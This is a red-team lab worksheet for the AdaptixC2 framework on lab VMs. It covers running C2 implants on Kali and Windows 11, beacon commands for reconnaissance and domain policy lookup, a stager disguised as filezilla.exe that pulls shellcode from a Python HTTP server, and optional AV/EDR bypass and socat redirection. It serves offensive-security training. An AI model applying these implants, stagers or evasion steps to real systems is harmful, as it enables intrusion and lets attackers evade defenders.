# LAB 3 — Initial Access

---

## Task 1 — Execute Gopher Agent on Kali

```bash
cd ~/AdaptixProjects/<YOUR PROJECT>/Payloads
chmod +x gopher_agent.elf
./gopher_agent.elf
```

Confirm the agent called back in the Adaptix client.

---

## Task 2 — Execute Agents on Win11

- Copy the following agents to the desktop and double-click to execute:
    - `basic_agent.x64.exe`
    - `Kharon.x64.exe`
    - `beatrice_agent.x64.exe`
    - `reflectra.exe`

- Copy `CharonArtifact.exe` and `basic_agent.enc` to the desktop, then run:
```powershell
cd C:\Users\seth.hawkins\Desktop
.\CharonArtifact.exe basic_agent.enc
```

**The sessions table should now show 5 agents — 4x Windows and 1x Linux.**

> **Note:** `basic_agent.x64.exe` is likely to be killed by Defender. Kharon may produce a Defender alert but will still call back.

---

## Task 3 — Interact with Kharon Agent

From the Kharon callback — right-click → `Console`:
```bash
beacon> help
beacon> info
beacon> help config
beacon> config sleep 10s
beacon> help execute bof
beacon> help execute postex
beacon> help execute-assembly
beacon> help sauroneye
beacon> help noconsolation
beacon> help remote-exec dcom
```

- Configure jitter to 50% of the current sleep
- List DNS cache entries
- Obtain the minimum password length using the Domaininfo BOF:
```bash
beacon> execute bof /opt/BOFs/c2-tool-collection/BOF/Domaininfo/Domaininfo.x64.o
```

---

## Task 4 — Interact with Gopher Agent

From the Gopher callback — right-click → `Console`:
```bash
beacon> help
beacon> shell whoami
beacon> shell id
beacon> run find / -type d -name bofs
```

---

## Task 5 — Interact with Other Agents

From the Beatrice, Reflectra, or Charon agent — right-click → `Console`:
```bash
beacon> help
beacon> ps list
beacon> disks
beacon> webdav enable
beacon> webdav status
beacon> help socks start
```

> **Note:** Right-click in the console window to enable `Auto scroll` and uncheck `Background image`.

---

## Task 6 — Execute Lucky-Spark Stager

### Part 1 — Start the Staging Server

On Kali, serve the shellcode from the Payloads directory:
```bash
cd ~/AdaptixProjects/<YOUR PROJECT>/Payloads
python3 -m http.server 1918
```

### Part 2 — Execute on WS01

On the Windows 11 VM, move `C:\DevTools\filezilla.exe` to the desktop and double-click to execute.

Confirm the staging server logs a `GET /basic_agent.x64.bin` request from `192.168.57.31`, then watch AdaptixC2 for the callback.

---

## Optional Task 1

Test if the Windows Gopher agent successfully bypasses AV/EDR using available bypass techniques.

> **Note:** `donut` is available to transform a `.exe` into shellcode if needed.

---

## Optional Task 2

Create a `socat` listener on Kali for the `LoadConfig` listener to redirect the C2 callback port to the listener's bind port. Execute `loaded_agent.x64.exe` from `C:\DevTools`. Does the agent connect back? What is the agent's sleep in seconds and jitter in percentage?

---

